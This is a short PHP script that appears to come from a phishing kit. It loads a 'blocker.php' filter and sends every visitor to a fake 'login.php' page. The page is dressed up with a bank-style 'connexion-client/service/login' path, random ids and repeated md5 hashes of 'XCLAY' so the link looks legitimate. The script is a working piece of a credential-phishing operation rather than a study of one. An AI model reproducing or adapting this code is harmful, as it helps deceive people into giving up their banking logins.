<?php
include('blocker.php');

if(isset($_GET['email']) && !empty($_GET['email'])){
$email = $_GET['email'];

header("Location: login.php?connexion-client/service/login?urlBack=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."".md5('XCLAY')."".md5('XCLAY')."");
}else{
header("Location: login.php?connexion-client/service/login?urlBack=".md5('XCLAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)."".md5('XCLAY')."".md5('XCLAY')."");
}

?>
